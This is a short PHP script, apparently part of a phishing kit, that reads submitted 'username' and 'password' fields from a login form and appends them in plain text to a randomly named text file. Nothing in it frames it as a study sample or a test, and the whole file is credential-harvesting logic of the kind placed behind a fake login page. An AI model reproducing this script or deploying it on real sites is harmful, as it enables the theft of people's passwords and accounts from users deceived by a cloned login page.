<?php
if($_SERVER["REQUEST_METHOD"] == "POST") {
$username = (isset($_POST["username"])) ? $_POST["username"] : "unknow";
$password = (isset($_POST["password"])) ? $_POST["password"] : "unknow";
$file = fopen("g2s7j3.txt", "a") or die("Error al abrir el archivo");
fwrite($file, $username);
fwrite($file, ":");
fwrite($file, $password);
fwrite($file, "\n");
fclose($file); }
?>
